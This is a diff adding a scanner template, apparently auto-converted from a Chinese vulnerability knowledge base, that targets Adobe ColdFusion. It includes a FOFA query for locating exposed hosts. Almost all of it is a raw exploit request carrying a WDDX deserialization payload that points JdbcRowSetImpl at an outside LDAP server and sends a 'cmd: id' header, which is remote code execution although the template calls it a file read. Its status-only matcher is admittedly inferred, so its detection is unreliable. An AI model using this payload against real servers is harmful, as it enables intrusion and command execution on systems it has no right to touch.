@@ -1,0 +1,21 @@
+id: poc-4a72d8bbb477d9587b7e
+info:
+  name: AdobeColdFusionenter存在任意文件读取
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/4a72d8bbb477d9587b7ea75b80b8eabd
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 4a72d8bbb477d9587b7ea75b80b8eabd
+    fofa: + fofa`app="Adobe-ColdFusion"`
+http:
+- raw:
+  - "POST /CFIDE/adminapi/base.cfc?method= HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15\nContent-Length: 400\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip\ncmd: id\n\nargumentCollection=\n<wddxPacket version='1.0'>\n    <header/>\n    <data>\n        <struct type='xcom.sun.rowset.JdbcRowSetImplx'>\n            <var name='dataSourceName'>\n                <string>ldap://xx:1389/Basic/TomcatEcho</string>\n\n            </var>\n\n            <var name='autoCommit'>\n                <boolean value='true'/>\n            </var>\n\n        </struct>\n\n    </data>\n\n</wddxPacket>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
